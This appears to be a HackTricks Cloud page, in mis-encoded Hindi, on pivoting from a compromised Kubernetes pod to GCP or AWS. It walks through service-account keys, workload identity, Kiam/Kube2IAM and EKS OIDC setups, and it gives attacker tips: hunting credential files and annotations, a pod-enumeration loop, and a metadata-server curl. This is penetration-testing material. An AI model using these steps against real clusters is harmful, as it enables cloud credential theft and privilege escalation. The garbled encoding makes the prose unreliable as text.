# рдХреНрдпреВрдмрд░рдиреЗрдЯреНрд╕ рд╕реЗ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдкрд┐рд╡рдЯ рдХрд░рдирд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## GCP

рдпрджрд┐ рдЖрдк GCP рдореЗрдВ рдПрдХ k8s рдХреНрд▓рд╕реНрдЯрд░ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рд╕рдВрднрд╛рд╡рддрдГ рдЪрд╛рд╣рд┐рдП рд╣реЛрдЧрд╛ рдХрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ GCP рдХрд╛ рдХреБрдЫ рдПрдХреНрд╕реЗрд╕ рд╣реЛред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рджреЛ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ:

### GCP-SA рдХреБрдВрдЬреА рдХреЛ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛

**GCP рдХреЗ рдПрдХ рдХреБрдмрд░рдиреЗрдЯреНрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ** рдХрд╛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ рд╣реИ:

* рдПрдХ GCP рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдмрдирд╛рдПрдВ
* рдЙрд╕рдореЗрдВ рдЪрд╛рд╣рд┐рдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдЗрдВрдб рдХрд░реЗрдВ
* рдмрдирд╛рдП рдЧрдП SA рдХреА рдПрдХ json рдХреБрдВрдЬреА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
* рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ
* рдЙрд╕ рдкрде рдХреЛ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ GOOGLE\_APPLICATION\_CREDENTIALS рдкрд░реНрдпрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ json рд╣реИред

{% hint style="warning" %}
рдЗрд╕рд▓рд┐рдП, рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЙрд╕ **env** **variable** рдФрд░ GCP рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд╕рд╛рде **json** **рдлрд╝рд╛рдЗрд▓реЗрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### GSA json рдХреЛ KSA рд╕реАрдХреНрд░реЗрдЯ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд░рдирд╛

рдПрдХ GSA рдХреЛ GKE рдХреНрд▓рд╕реНрдЯрд░ рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рдЙрдиреНрд╣реЗрдВ рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдХреЗ:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* рдПрдХ Kubernetes рд╕реАрдХреНрд░реЗрдЯ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдЖрдк GKE рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ GCP рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╣реЛрдВред рдЖрдк рдЗрд╕реЗ `gcloud` рдХрдорд╛рдВрдб-рд▓рд╛рдЗрди рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрди рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Kubernetes рд╕реАрдХреНрд░реЗрдЯ рдХреЛ Kubernetes рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░реЗрдВ:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
рджреВрд╕рд░реЗ рд╕реНрдЯреЗрдк рдореЗрдВ, GSA рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ KSA рдХреЗ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдлрд┐рд░, рдЕрдЧрд░ рдЖрдк GKE рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рд╕реЗ рдЙрд╕ рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ GCP рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдЙрдиреНрдирддрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### GKE Workload Identity

рд╡рд░реНрдХрд▓реЛрдб рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреА рдХреЗ рд╕рд╛рде, рд╣рдо рдПрдХ Kubernetes рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ рдПрдХ Google рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреА рддрд░рд╣ рдХрд╛рд░реНрдп рдХрд░реЗред Kubernetes рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рдкреЙрдбреНрд╕ рдХреЛ Google Cloud APIs рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╕рдордп рдЕрдкрдиреЗ рдЖрдк Google рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдкрд╣рд▓реА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЗ рд╕реНрдЯреЗрдк** рдпрд╣ рд╣реИ рдХрд┐ **GCP рдореЗрдВ рд╡рд░реНрдХрд▓реЛрдб рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреА рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ** ([**рд╕реНрдЯреЗрдкреНрд╕**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) рдФрд░ рдЙрд╕ GCP рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ рдмрдирд╛рдПрдВ рдЬрд┐рд╕реЗ рдЖрдк k8s рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

* рдПрдХ рдирдП рдХреНрд▓рд╕реНрдЯрд░ рдкрд░ **рд╡рд░реНрдХрд▓реЛрдб рдЖрдЗрдбреЗрдВрдЯрд┐рдЯреА рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **рдирдпрд╛ рдиреЛрдбрдкреВрд▓ рдмрдирд╛рдПрдВ / рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ** (рдСрдЯреЛрдкрд╛рдпрд▓рдЯ рдХреНрд▓рд╕реНрдЯрд░реНрд╕ рдХреЛ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8s рдореЗрдВ GCP рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдмрдирд╛рдПрдВ рдЬрд┐рд╕реЗ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GCP рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВ: 

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **рдХреНрд▓рд╕реНрдЯрд░** рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рдХрд░реЗрдВ рдФрд░ **рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ** рдмрдирд╛рдПрдВ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSA рдХреЛ KSA рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдВрдб рдХрд░реЗрдВ**
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA** рдХреЗ рд╕рд╛рде рдПрдХ **рдкреЙрдб** рдЪрд▓рд╛рдПрдВ рдФрд░ **GSA** рдХреА **рдкрд╣реБрдВрдЪ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреА рдкреНрд░рдорд╛рдгрд┐рддреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ K8s рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ **`iam.gke.io/gcp-service-account` рдПрдиреЛрдЯреЗрд╢рди** рдХреЗ рд╕рд╛рде **SAs рдХреА рдЦреЛрдЬ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ SA рдХрд┐рд╕реА рдЪреАрдЬрд╝ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ GCP рдореЗрдВред рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╣рд░ KSA рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдкрд╣реБрдВрдЪ рд╣реИред\
GCP рд╕реЗ рд╣рдореЗрд╢рд╛ рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЛ рдЧрдгрдирд╛ рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВ рдХрд┐ **рдХреНрдпрд╛ рдкрд╣реБрдВрдЪ рдЖрдк Kubernetes рдХреЗ рдЕрдВрджрд░ SAs рдХреЛ рджреЗ рд░рд╣реЗ рд╣реИрдВ**ред
{% endhint %}

рдпрд╣ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ **рд╕рднреА рдкреЙрдб рдкрд░рд┐рднрд╛рд╖рд╛рдУрдВ рдкрд░ рдЗрдЯрд░реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЙрд╕ **рдПрдиреЛрдЯреЗрд╢рди** рдХреА **рдЦреЛрдЬ** рдХрд░ рд░рд╣реЗ рд╣реИрдВ:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam рдФрд░ Kube2IAM (Pods рдХреЗ рд▓рд┐рдП IAM рд░реЛрд▓) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

IAM рд░реЛрд▓реНрд╕ рдХреЛ Pods рдХреЛ рджреЗрдиреЗ рдХрд╛ (рдкреБрд░рд╛рдирд╛) рдПрдХ рддрд░реАрдХрд╛ рд╣реИ [**Kiam**](https://github.com/uswitch/kiam) рдпрд╛ [**Kube2IAM**](https://github.com/jtblin/kube2iam) **рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред** рдореВрд▓ рд░реВрдк рд╕реЗ, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдПрдХ **рдбреЗрдордирд╕реЗрдЯ** рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдЗрдВрдЬреАрдирд┐рдпрд░реА рдЖрдИрдПрдПрдо рд░реЛрд▓** рд╣реЛрдЧрд╛ред рдпрд╣ рдбреЗрдордирд╕реЗрдЯ рд╣реА рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ рдкреЙрдбреНрд╕ рдХреЛ рдЖрдИрдПрдПрдо рд░реЛрд▓реНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рджреЗрдЧрд╛ рдЬреЛ рдЗрд╕реЗ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдВрдЧреЗред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ **рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдЕрдВрджрд░ рдкрд╣реБрдВрдЪ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд░реЛрд▓реНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**, рдФрд░ рдЖрдк рдЗрд╕реЗ рдиреЗрдорд╕реНрдкреЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдПрдиреЛрдЯреЗрд╢рди рдХреЗ рд╕рд╛рде рдХрд░рддреЗ рд╣реИрдВ:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

рдПрдХ рдмрд╛рд░ рдиреЗрдорд╕реНрдкреЗрд╕ IAM рд░реЛрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдкреЙрдбреНрд╕ рдХреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдкреЙрдб рдкрд░ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕ рд░реЛрд▓ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк рдкреЙрдб рдпрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдпрд╛ рдХреБрдмреЗ-рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдХрд┐рдпрд╛рдо/рдХреНрдпреВрдмреЗ2рдЖрдИрдПрдПрдо рд╕рд░реНрд╡рд░ рдореЗрдВ рдпреЗ рдПрдиреЛрдЯреЗрд╢рдиреНрд╕ рдорд┐рд▓рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреЙрдбреНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╣рд░ рднреВрдорд┐рдХрд╛ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдзрд┐рдХ (рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ AWS рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рддреЛ рднреВрдорд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ)ред
{% endhint %}

#### IAM рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдкреЙрдб рдмрдирд╛рдПрдБ

{% hint style="info" %}
рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдХрд┐рдпрд╛рдо/рдХреНрдпреВрдмреЗ2рдЖрдИрдПрдПрдо рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╣реА AWS рдЦрд╛рддреЗ рдореЗрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрд╕ рднреВрдорд┐рдХрд╛ рдХреЛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM рд░реЛрд▓ рдХреЗ рд▓рд┐рдП K8s рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

рдпрд╣ **AWS рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд╢рдВрд╕рд┐рдд рддрд░реАрдХрд╛ рд╣реИ**ред

1. рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП [OIDC рдкреНрд░рджрд╛рддрд╛ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html)ред
2. рдлрд┐рд░ рдЖрдкрдХреЛ рдПрдХ IAM рд░реЛрд▓ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред
3. IAM рд░реЛрд▓ рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЗ рдмреАрдЪ [рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) рдмрдирд╛рдПрдВ (рдпрд╛ рдирд╛рдорд╕реНрдерд╛рди рдЬреЛ рд░реЛрд▓ рдХреЛ рдирд╛рдорд╕реНрдерд╛рди рдХреЗ рд╕рднреА рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рджреЗрддрд╛ рд╣реИ)ред _рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рдореБрдЦреНрдп рд░реВрдк рд╕реЗ OIDC рдкреНрд░рджрд╛рддрд╛ рдирд╛рдо, рдирд╛рдорд╕реНрдерд╛рди рдирд╛рдо рдФрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛_ред
4. рдЕрдВрдд рдореЗрдВ, **рдПрдХ рдПрд╕рдП рдХреЛ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдПрдЖрд░рдПрди рдХреА рд╕рдВрдХреЗрддрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЯрд┐рдкреНрдкрдгреА рд╣реЛ**, рдФрд░ рдЙрд╕ рдПрд╕рдП рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рдкреЙрдбреНрд╕ рдХреЛ **рд░реЛрд▓ рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА**ред **рдЯреЛрдХрди** рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓рд┐рдЦрд╛** рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрде **`AWS_WEB_IDENTITY_TOKEN_FILE`** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)ред
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
